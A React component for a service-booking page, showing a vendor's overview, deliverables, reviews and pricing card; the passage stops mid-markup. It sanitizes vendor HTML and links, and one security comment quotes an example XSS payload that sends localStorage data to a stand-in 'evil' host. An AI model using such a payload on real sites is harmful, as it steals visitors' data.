/**
 * ServiceDetail — public service page at /:username/:slug
 * Sections: Hero · scrolling sections (Overview, Deliverables, Host, FAQ, Important Notes, Reviews) · Sticky sidebar
 */
import { useState, useEffect, useLayoutEffect, useRef } from 'react';
import { useParams, Link, useNavigate } from 'react-router-dom';
import DOMPurify from 'dompurify';
import { svcGetPublicByProfile, getAvailableSlots } from '../services/api';
import { applyProfileTheme, isValidHex, DEFAULT_THEME_COLOR } from '../utils/themeUtils';
import Seo from '../components/common/Seo';
import ErrorPage from './ErrorPage';
import TransientError from '../components/error/TransientError';
import { isNotFoundError } from '../utils/fetchError';
import { useMinimalFooter } from '../context/ChromeContext';
import { resolveServiceSeo, serviceJsonLd, breadcrumbJsonLd, faqJsonLd, SITE_URL } from '../utils/seo';
import { serviceFaqs } from '../utils/serviceFaqs';
import PetalSpinner from '../components/common/PetalSpinner';
import { prerendered } from '../services/prerenderData';

// Production base for canonical/OG (Vercel env overrides the apex default).
const SEO_SITE = import.meta.env?.VITE_PUBLIC_SITE_URL || SITE_URL;

// Sanitize vendor-supplied rich text before rendering as HTML. Strips <script>,
// event handlers (onerror/onload/…), javascript:/data: URLs, <iframe>, etc.
// SECURITY: long_description is vendor-controlled and shown on a public page —
// rendering it raw is stored XSS against every guest/host who views it.
const sanitizeHtml = (dirty) =>
  DOMPurify.sanitize(String(dirty || ''), { USE_PROFILES: { html: true } });

// ─── Helpers ─────────────────────────────────────────────────────────────────

const fmtDuration = (min) => {
  if (!min) return '—';
  if (min < 60) return `${min} min`;
  const h = Math.floor(min / 60), m = min % 60;
  return m ? `${h}h ${m}m` : `${h}h`;
};

// "14:30" → "2:30 PM". Slots come back from the API as 24h "HH:MM" strings.
const fmt12 = (hhmm) => {
  const [h, m] = String(hhmm).split(':').map(Number);
  if (Number.isNaN(h)) return hhmm;
  const ap = h >= 12 ? 'PM' : 'AM';
  const h12 = ((h + 11) % 12) + 1;
  return `${h12}:${String(m || 0).padStart(2, '0')} ${ap}`;
};

// Friendly label for a date relative to today: Today / Tomorrow / "Wed".
const dayLabel = (d) => {
  const today = new Date(); today.setHours(0, 0, 0, 0);
  const dd = new Date(d); dd.setHours(0, 0, 0, 0);
  const diff = Math.round((dd - today) / 86400000);
  if (diff === 0) return 'Today';
  if (diff === 1) return 'Tomorrow';
  return dd.toLocaleDateString('en-IN', { weekday: 'short' });
};

// "Jun 25" sub-label under the day name.
const shortDate = (d) =>
  new Date(d).toLocaleDateString('en-IN', { month: 'short', day: 'numeric' });

// Map the service type enum to a human label for the hero eyebrow.
const TYPE_LABEL = { '1-on-1': '1:1 Session', group: 'Group Session', paid_dm: 'Priority DM' };

const Stars = ({ avg, count, size = 'sm' }) => {
  const sz = size === 'lg' ? 'w-5 h-5' : 'w-4 h-4';
  return (
    <div className="flex items-center gap-1">
      {[1,2,3,4,5].map(s => (
        <svg key={s} className={`${sz} ${s <= Math.round(avg) ? 'text-amber-400' : 'text-gray-200'}`} fill="currentColor" viewBox="0 0 20 20">
          <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/>
        </svg>
      ))}
      {count > 0 && <span className="text-xs text-gray-500 ml-1">{avg?.toFixed(1)} ({count})</span>}
    </div>
  );
};

// ─── Social icons — outline (linear) set, monochrome ──────────────────────────
const SOCIAL_ICONS = {
  instagram: <><rect x="2" y="2" width="20" height="20" rx="5" ry="5" /><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" /><line x1="17.5" y1="6.5" x2="17.51" y2="6.5" /></>,
  youtube: <><path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33A2.78 2.78 0 0 0 3.4 19c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.25 29 29 0 0 0-.46-5.33z" /><polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02" /></>,
  linkedin: <><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" /><rect x="2" y="9" width="4" height="12" /><circle cx="4" cy="4" r="2" /></>,
  facebook: <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" />,
  twitter:  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" />,
  whatsapp: <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" />,
  website: <><circle cx="12" cy="12" r="10" /><line x1="2" y1="12" x2="22" y2="12" /><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" /></>,
  github: <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />,
  email: <><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" /><polyline points="22,6 12,13 2,6" /></>,
};
const SOCIAL_ORDER = ['instagram', 'youtube', 'linkedin', 'facebook', 'twitter', 'whatsapp', 'website', 'github', 'email'];

// Sanitize a vendor-supplied social link before using it as an href. social_links
// are vendor-controlled — a value like `javascript:fetch('//evil/?c='+localStorage.user)`
// would be stored XSS against any visitor who clicks it. Allow only http(s) links
// (and mailto: for a valid email); anything else collapses to a harmless '#'.
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const safeUrl = (value, isEmail = false) => {
  const v = String(value || '').trim();
  if (isEmail) {
    const addr = v.replace(/^mailto:/i, '');
    return EMAIL_RE.test(addr) ? `mailto:${addr}` : '#';
  }
  return /^https?:\/\//i.test(v) ? v : '#';
};

const SocialIcon = ({ platform, href }) => {
  const icon = SOCIAL_ICONS[platform];
  if (!icon || !href) return null;
  const cleanHref = safeUrl(href, platform === 'email');
  if (cleanHref === '#') return null;
  return (
    <a href={cleanHref} target="_blank" rel="noreferrer"
      className="flex items-center justify-center flex-shrink-0 text-gray-500 border border-gray-200 rounded-lg hover:text-gray-900 hover:border-gray-300 hover:bg-gray-50 transition-colors"
      style={{ width: 34, height: 34 }}
      title={platform.charAt(0).toUpperCase() + platform.slice(1)}>
      <svg className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth={1.8} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
        {icon}
      </svg>
    </a>
  );
};

// Service-meta label for the booking card — "30 Minutes", "1h 30m", etc.
const fmtMetaDuration = (min) => {
  if (!min) return '—';
  if (min < 60) return `${min} Minutes`;
  return fmtDuration(min);
};

// ─── Tab components ───────────────────────────────────────────────────────────

const COLLAPSED_H = 320;

const OverviewTab = ({ html }) => {
  const [expanded, setExpanded] = useState(false);
  const ref = useRef(null);
  const clean = sanitizeHtml(html);
  const [tall, setTall] = useState(false);
  const [fullH, setFullH] = useState(0);

  // Measure full content height so max-height can animate to a real px value
  // (CSS can't transition to `auto`). useLayoutEffect so the collapse is applied
  // BEFORE paint — a plain useEffect measures after paint and snaps the height,
  // which is a visible CLS jump on this prerendered ad-landing page.
  useLayoutEffect(() => {
    const measure = () => {
      if (!ref.current) return;
      const h = ref.current.scrollHeight;
      setFullH(h);
      setTall(h > COLLAPSED_H);
    };
    measure();
    window.addEventListener('resize', measure);
    return () => window.removeEventListener('resize', measure);
  }, [clean]);

  if (!clean) return <p className="text-gray-400 text-sm">No overview provided.</p>;

  return (
    <div className="relative">
      <div
        ref={ref}
        className="prose prose-sm max-w-none text-gray-700 overflow-hidden transition-[max-height] duration-500 ease-in-out"
        style={{ maxHeight: tall ? (expanded ? fullH : COLLAPSED_H) : undefined }}
        dangerouslySetInnerHTML={{ __html: clean }}
      />
      {tall && (
        <div
          className={`pointer-events-none absolute bottom-0 left-0 right-0 h-20 bg-gradient-to-t from-white to-transparent transition-opacity duration-300 ${expanded ? 'opacity-0' : 'opacity-100'}`}
        />
      )}
      {tall && (
        <button onClick={() => setExpanded(e => !e)}
          className="mt-3 text-sm font-medium text-primary hover:underline flex items-center gap-1">
          {expanded ? 'Show Less' : 'Show More'}
          <svg className={`w-4 h-4 transition-transform duration-300 ${expanded ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7"/>
          </svg>
        </button>
      )}
    </div>
  );
};

const DeliverablesTab = ({ included = [], excluded = [] }) => (
  <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
    <div>
      <h3 className="text-sm font-bold text-gray-800 mb-3 flex items-center gap-2">
        <span className="w-5 h-5 rounded-full bg-green-100 text-green-700 flex items-center justify-center text-xs">✓</span>
        What's Included
      </h3>
      {included.length === 0
        ? <p className="text-xs text-gray-400">Not specified</p>
        : <div className="flex flex-wrap gap-2">
            {included.map((item, i) => (
              <span key={i} className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-green-50 border border-green-200 text-green-800 text-xs font-medium">
                <svg className="w-3 h-3 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7"/></svg>
                {item}
              </span>
            ))}
          </div>
      }
    </div>
    <div>
      <h3 className="text-sm font-bold text-gray-800 mb-3 flex items-center gap-2">
        <span className="w-5 h-5 rounded-full bg-red-100 text-red-600 flex items-center justify-center text-xs">✕</span>
        Not Included
      </h3>
      {excluded.length === 0
        ? <p className="text-xs text-gray-400">Not specified</p>
        : <div className="flex flex-wrap gap-2">
            {excluded.map((item, i) => (
              <span key={i} className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-50 border border-red-200 text-red-800 text-xs font-medium">
                <svg className="w-3 h-3 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M6 18L18 6M6 6l12 12"/></svg>
                {item}
              </span>
            ))}
          </div>
      }
    </div>
  </div>
);

const HostTab = ({ vendor, totalServices, totalBookings = 0 }) => {
  if (!vendor?.name) return <p className="text-gray-400 text-sm">No host info.</p>;
  return (
    <div className="flex flex-col sm:flex-row gap-5 items-start">
      <div className="flex-shrink-0">
        {vendor.profile_image
          ? <img src={vendor.profile_image} alt={vendor.name} className="w-20 h-20 rounded-2xl object-cover border-2 border-white shadow-md"/>
          : <div className="w-20 h-20 rounded-2xl bg-primary/10 flex items-center justify-center text-3xl font-bold text-primary">{vendor.name.charAt(0)}</div>}
      </div>
      <div className="flex-1 min-w-0">
        <div className="flex items-center gap-2 mb-1">
          <h3 className="text-lg font-bold text-gray-900">{vendor.name}</h3>
          {vendor.is_verified && (
            <svg className="w-5 h-5 flex-shrink-0" viewBox="0 0 24 24" fill="none" aria-label="Verified" style={{ transform: 'translate(-2px, 1px)' }}>
              <path className="fill-primary" d="M21 12c0 1.268-.63 2.39-1.593 3.068a3.745 3.745 0 0 1-1.043 3.296 3.745 3.745 0 0 1-3.296 1.043A3.745 3.745 0 0 1 12 21c-1.268 0-2.39-.63-3.068-1.593a3.746 3.746 0 0 1-3.296-1.043 3.745 3.745 0 0 1-1.043-3.296A3.745 3.745 0 0 1 3 12c0-1.268.63-2.39 1.593-3.068a3.745 3.745 0 0 1 1.043-3.296 3.746 3.746 0 0 1 3.296-1.043A3.746 3.746 0 0 1 12 3c1.268 0 2.39.63 3.068 1.593a3.746 3.746 0 0 1 3.296 1.043 3.746 3.746 0 0 1 1.043 3.296A3.745 3.745 0 0 1 21 12Z"/>
              <path d="M8.5 12.5l2.25 2.25L15.5 10" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          )}
        </div>
        {(vendor.profession || vendor.tagline) && (
          <p className="text-sm text-primary font-medium mb-2">{vendor.profession || vendor.tagline}</p>
        )}
        {vendor.bio && <p className="text-sm text-gray-600 mb-3 leading-relaxed">{vendor.bio}</p>}
        <div className="flex flex-wrap gap-4 text-xs text-gray-500 mb-4">
          <span><strong className="text-gray-800">{totalServices}</strong> services</span>
          <span><strong className="text-gray-800">{totalBookings}</strong> bookings</span>
        </div>
        {vendor.username && (
          <Link to={`/${vendor.username}`}
            className="inline-flex items-center gap-1.5 text-sm font-medium text-primary hover:underline">
            Visit Profile
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
          </Link>
        )}
      </div>
    </div>
  );
};

// ─── Important Notes — host-authored pre-booking notes (blush callout) ─────────
const ImportantNotes = ({ text }) => (
  <div className="mt-card mt-card--blush flex gap-3 p-4">
    <svg className="w-5 h-5 flex-shrink-0 mt-0.5 text-maroon" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
      <circle cx="12" cy="12" r="9"/><path strokeLinecap="round" d="M12 16v-4M12 8.5h.01"/>
    </svg>
    <p className="text-sm leading-relaxed whitespace-pre-line text-ink">{text}</p>
  </div>
);

// ─── Available Slots preview — real server slots, next 2 open days × 2 each ────
// Self-contained: fetches only when mounted (i.e. when the Host section renders).
// Scans up to 7 days, stops at 2 with openings.
const AvailableSlotsPreview = ({ hostId, serviceId, onViewAll }) => {
  const [days, setDays] = useState(null); // null = loading · [] = none found

  useEffect(() => {
    let cancelled = false;
    (async () => {
      if (!hostId || !serviceId) { setDays([]); return; }
      const found = [];
      const today = new Date(); today.setHours(0, 0, 0, 0);
      for (let i = 0; i < 7 && found.length < 2; i++) {
        const d = new Date(today); d.setDate(today.getDate() + i);
        const dateStr = `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
        try {
          const { data } = await getAvailableSlots(hostId, serviceId, dateStr);
          const slots = Array.isArray(data?.slots) ? data.slots : [];
          if (slots.length) found.push({ date: d, slots: slots.slice(0, 2) });
        } catch { /* skip this day, keep scanning */ }
      }
      if (!cancelled) setDays(found);
    })();
    return () => { cancelled = true; };
  }, [hostId, serviceId]);

  return (
    <div className="mt-6 pt-6 border-t border-gray-100">
      <div className="flex items-center justify-between mb-4">
        <h3 className="text-sm font-bold text-gray-900">Available slots</h3>
        <button onClick={onViewAll} className="text-sm font-medium hover:underline"
          style={{ color: 'var(--profile-accent, #960D32)' }}>
          View all →
        </button>
      </div>
      {days === null ? (
        <div className="flex gap-2">
          {[0, 1].map(i => <div key={i} className="h-14 flex-1 rounded-xl bg-gray-100 animate-pulse"/>)}
        </div>
      ) : days.length === 0 ? (
        <p className="text-sm text-gray-400">No open slots in the next few days — tap “View all” for the full calendar.</p>
      ) : (
        <div className="space-y-3">
          {days.map(({ date, slots }) => (
            <div key={date.toISOString()} className="flex items-center gap-3">
              <div className="w-20 flex-shrink-0">
                <div className="text-sm font-semibold text-gray-900">{dayLabel(date)}</div>
                <div className="text-xs text-gray-400">{shortDate(date)}</div>
              </div>
              <div className="flex flex-wrap gap-2">
                {slots.map(t => (
                  <button key={t} onClick={onViewAll}
                    className="btn btn--outline px-3.5 py-1.5 text-sm font-medium hover:border-gray-300">
                    {fmt12(t)}
                  </button>
                ))}
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

const FAQTab = ({ faqs = [] }) => {
  const [open, setOpen] = useState(null);
  if (faqs.length === 0) return <p className="text-gray-400 text-sm">No FAQs provided.</p>;
  return (
    <div className="divide-y divide-gray-100">
      {faqs.map((faq, i) => (
        <div key={i} className="py-4">
          <button onClick={() => setOpen(open === i ? null : i)}
            className="w-full flex items-center justify-between gap-3 text-left">
            <span className="text-sm font-semibold text-gray-800">{faq.question}</span>
            <svg className={`w-5 h-5 flex-shrink-0 text-gray-400 transition-transform ${open === i ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7"/>
            </svg>
          </button>
          {open === i && <p className="mt-3 text-sm text-gray-600 leading-relaxed pr-8">{faq.answer}</p>}
        </div>
      ))}
    </div>
  );
};

// Maroon review star (brand) — filled or empty. Marigold is reserved for open slots.
const RevStar = ({ filled }) => (
  <svg className="w-3.5 h-3.5" style={{ color: filled ? 'var(--mt-maroon, #960D32)' : '#EBDCD9' }} fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
);

const ReviewsTab = ({ reviews = [], avgRating, ratingBreakdown = [] }) => {
  const total = reviews.length;
  const avg = avgRating || 0;
  // Always show the summary — fall back to an empty 5→1 breakdown when no reviews
  const breakdown = ratingBreakdown.length
    ? ratingBreakdown
    : [5, 4, 3, 2, 1].map(star => ({ star, count: 0 }));
  // % recommend = share of 4- and 5-star ratings
  const positive = breakdown.filter(b => b.star >= 4).reduce((s, b) => s + (b.count || 0), 0);
  const recommendPct = total ? Math.round((positive / total) * 100) : 0;
  // Promote the first review that has a comment into a featured pull-quote.
  const featured = reviews.find(r => r.comment) || null;
  const rest = featured ? reviews.filter(r => r !== featured) : reviews;
  const fmtDate = (d) => new Date(d).toLocaleDateString('en-IN', { day: 'numeric', month: 'short', year: 'numeric' });

  return (
    <div>
      {/* Summary — score + per-star bars on a blush panel */}
      <div className="flex flex-col sm:flex-row items-stretch gap-5 rounded-2xl p-5 mb-4 bg-blush">
        <div className="flex flex-shrink-0 flex-col items-center justify-center text-center sm:border-r sm:pr-6"
          style={{ borderColor: 'color-mix(in srgb, var(--mt-maroon, #960D32) 16%, transparent)' }}>
          <div className="text-5xl font-black leading-none text-maroon">{avg.toFixed(1)}<span className="text-xl font-bold text-gray-400">/5</span></div>
          <div className="mt-2 flex gap-0.5">{[1,2,3,4,5].map(s => <RevStar key={s} filled={s <= Math.round(avg)} />)}</div>
          <p className="mt-1.5 text-xs text-gray-500">{total} review{total === 1 ? '' : 's'}</p>
        </div>
        <div className="flex flex-1 flex-col justify-center gap-1.5">
          {breakdown.map(({ star, count }) => {
            const pct = total ? Math.round((count / total) * 100) : 0;
            return (
              <div key={star} className="flex items-center gap-2">
                <span className="w-3 text-right text-xs font-medium text-gray-500">{star}</span>
                <RevStar filled />
                <div className="h-2 flex-1 overflow-hidden rounded-full bg-white">
                  <div className="h-full rounded-full transition-all" style={{ width: `${pct}%`, background: 'var(--mt-maroon, #960D32)' }}/>
                </div>
                <span className="w-9 text-right text-xs text-gray-500">{pct}%</span>
              </div>
            );
          })}
        </div>
      </div>

      {total === 0 ? (
        <p className="text-gray-400 text-sm">No reviews yet.</p>
      ) : (
        <>
          {recommendPct >= 1 && (
            <div className="inline-flex items-center gap-2 mb-4 rounded-full px-3.5 py-2 text-sm font-semibold"
              style={{ background: 'var(--green-100, #E3F4EA)', color: 'var(--green-600, #1F7A4D)' }}>
              <svg className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M14 9V5a3 3 0 00-3-3l-4 9v11h11.28a2 2 0 002-1.7l1.38-9a2 2 0 00-2-2.3zM7 22H4a2 2 0 01-2-2v-7a2 2 0 012-2h3"/></svg>
              {recommendPct}% of guests recommend this session
            </div>
          )}

          {featured && (
            <figure className="relative overflow-hidden rounded-2xl p-6 mb-4 bg-blush">
              <span aria-hidden className="pointer-events-none absolute -top-2 left-4 font-serif italic text-maroon/20" style={{ fontSize: 110, lineHeight: 1 }}>“</span>
              <blockquote className="relative font-serif italic text-ink leading-snug mb-4" style={{ fontSize: 'clamp(18px, 4vw, 22px)', maxWidth: '46ch' }}>
                {featured.comment}
              </blockquote>
              <figcaption className="flex items-center flex-wrap gap-x-3 gap-y-2">
                <span className="flex h-11 w-11 flex-shrink-0 items-center justify-center rounded-full font-bold text-white" style={{ background: 'var(--mt-maroon, #960D32)' }}>
                  {featured.profiles?.name?.charAt(0) || '?'}
                </span>
                <span>
                  <span className="block text-sm font-semibold text-gray-900">
                    {featured.profiles?.name || 'Guest'}
                    {featured.booking_id && (
                      <span className="ml-2 inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[11px] font-semibold align-middle" style={{ background: 'var(--green-100, #E3F4EA)', color: 'var(--green-600, #1F7A4D)' }}>
                        <svg className="w-2.5 h-2.5" fill="none" stroke="currentColor" strokeWidth={2.6} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7"/></svg>
                        Verified booking
                      </span>
                    )}
                  </span>
                  <span className="block text-xs text-gray-400">{fmtDate(featured.created_at)}</span>
                </span>
                <span className="ml-auto flex gap-0.5">{[1,2,3,4,5].map(s => <RevStar key={s} filled={s <= Math.round(featured.rating)} />)}</span>
              </figcaption>
            </figure>
          )}

          {rest.length > 0 && (
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {rest.map(r => (
                <div key={r.id} className="flex flex-col rounded-2xl border border-gray-100 bg-white p-5">
                  <div className="mb-3 flex gap-0.5">{[1,2,3,4,5].map(s => <RevStar key={s} filled={s <= Math.round(r.rating)} />)}</div>
                  {r.comment && <p className="flex-1 text-sm leading-relaxed text-gray-700">“{r.comment}”</p>}
                  <div className="mt-4 flex items-center gap-2.5 border-t border-gray-50 pt-3">
                    <div className="flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-full text-xs font-bold bg-blush text-maroon">
                      {r.profiles?.name?.charAt(0) || '?'}
                    </div>
                    <div className="min-w-0">
                      <div className="truncate text-sm font-semibold text-gray-900">{r.profiles?.name || 'Anonymous'}</div>
                      <div className="text-xs text-gray-400">{fmtDate(r.created_at)}</div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </>
      )}
    </div>
  );
};

// ─── Booking Card (sticky sidebar on desktop, block on mobile) ────────────────

// Conversion-focused trust signals shown under the CTA.
const TRUST_SIGNALS = [
  { key: 'verified',  label: 'Verified host',
    path: 'M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z' },
  { key: 'instant',   label: 'Instant confirmation',
    path: 'M13 10V3L4 14h7v7l9-11h-7z' },
];

const BookingCard = ({ service, onBookNow, bookingFee = 0, bookingFeeBreakdown = { platformFee: 0, tax: 0 }, compact = false, motionOK = true }) => {
  const priceOnRequest = service.price_on_request === true;
  const isFree = service.price === 0;
  const [feeTipOpen, setFeeTipOpen] = useState(false);

  const imgWrapRef = useRef(null);
  const [imgH, setImgH] = useState(0);
  // useLayoutEffect: reserve the image height before paint to avoid a CLS jump.
  useLayoutEffect(() => {
    if (imgWrapRef.current) setImgH(imgWrapRef.current.scrollHeight);
  }, [service.thumbnail_url]);

  const { platformFee = 0, tax = 0 } = bookingFeeBreakdown || {};
  const total = service.price + bookingFee;

  return (
    <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
      {/* Thumbnail — collapses on scroll past hero */}
      <div
        ref={imgWrapRef}
        aria-hidden={compact}
        className="overflow-hidden"
        style={{
          maxHeight: compact ? 0 : (imgH || 240),
          opacity: compact ? 0 : 1,
          transform: compact ? 'translateY(-10px) scale(0.97)' : 'none',
          transition: motionOK
            ? 'max-height 460ms cubic-bezier(0.22,1,0.36,1), opacity 300ms ease, transform 460ms cubic-bezier(0.22,1,0.36,1)'
            : 'none',
        }}
      >
        <img src={service.thumbnail_url || '/service-og-default.jpg'} alt={service.title}
             className="w-full aspect-[16/10] object-cover"/>
      </div>
      <div className="p-5">
        {/* Pricing — service price + platform fee & tax breakdown */}
        <div className="mb-1">
          {priceOnRequest ? (
            <div className="text-2xl font-black text-gray-900 leading-none">Price on request</div>
          ) : isFree ? (
            <div className="text-3xl font-black text-gray-900 leading-none">Free</div>
          ) : (
            <>
              <div className="flex items-baseline gap-2">
                <span className="text-3xl font-black text-gray-900 leading-none">₹{service.price}</span>
              </div>
              {platformFee > 0 && (
                <p className="relative mt-1.5 flex items-center gap-1 text-xs text-gray-500">
                  <span>+ ₹{platformFee} platform fee</span>
                  <button type="button" onClick={() => setFeeTipOpen(o => !o)} aria-label="View fee breakdown"
                    className="text-gray-400 hover:text-gray-600 transition-colors">
                    <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
                      <circle cx="12" cy="12" r="9"/><path strokeLinecap="round" d="M12 16v-4M12 8.5h.01"/>
                    </svg>
                  </button>
                  {feeTipOpen && (
                    <>
                      <button type="button" aria-hidden tabIndex={-1}
                        className="fixed inset-0 z-10 cursor-default" onClick={() => setFeeTipOpen(false)}/>
                      <div className="absolute z-20 left-0 top-full mt-2 w-64 rounded-xl border border-gray-200 bg-white text-gray-700 text-xs leading-relaxed p-3.5 shadow-xl">
                        <span className="absolute -top-1.5 left-6 w-3 h-3 rotate-45 border-l border-t border-gray-200 bg-white"/>
                        <p className="mb-2 font-semibold text-gray-900">Price breakdown</p>
                        <div className="space-y-1.5">
                          <div className="flex items-center justify-between">
                            <span>Service price</span><span className="font-medium text-gray-900">₹{service.price}</span>
                          </div>
                          <div className="flex items-center justify-between">
                            <span>Platform fee</span><span className="font-medium text-gray-900">₹{platformFee}</span>
                          </div>
                          <div className="flex items-center justify-between">
                            <span>Tax (GST)</span><span className="font-medium text-gray-900">₹{tax}</span>
                          </div>
                          <div className="mt-1.5 flex items-center justify-between border-t border-gray-100 pt-1.5">
                            <span className="font-semibold text-gray-900">Total</span>
                            <span className="font-bold text-gray-900">₹{total.toFixed(2)}</span>
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                </p>
              )}
            </>
          )}
        </div>

        {/* Primary CTA */}
        <button onClick={onBookNow}
          className="btn cta-press w-full py-3.5 font-bold text-sm mt-4">
          Book a Slot
        </button>

        {/* Guest policies agreement — directly under the CTA */}
        <p className="mt-3 text-[11px] text-gray-400 leading-relaxed">
          By proceeding, you agree to our{' '}
          <Link to="/terms" className="underline hover:text-gray-600 transition-colors">Guest Policies</Link>.
        </p>

        {/* Trust indicators */}
        <ul className="mt-5 pt-5 border-t border-gray-100 space-y-3 leading-5">
          {TRUST_SIGNALS.map(({ key, label, path }) => (
            <li key={key} className="flex items-start gap-2.5 text-xs text-gray-600">
              <svg className="w-4 h-4 flex-shrink-0 text-green-500 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={path}/>
              </svg>
              <span>{label}</span>
            </li>
          ))}

          {/* Social proof — real all-time bookings, not a fabricated count */}
          {service.total_bookings > 0 && (
            <li className="flex items-start gap-2.5 text-xs text-gray-600">
              <svg className="w-4 h-4 flex-shrink-0 text-maroon mt-0.5" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"/>
              </svg>
              <span><strong className="text-gray-800">{service.total_bookings}</strong> {service.total_bookings === 1 ? 'session' : 'sessions'} booked</span>
            </li>
          )}

          {/* Safety */}
          <li className="flex items-start gap-2.5 text-xs text-gray-600">
            <svg className="w-4 h-4 flex-shrink-0 text-green-500 mt-0.5" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
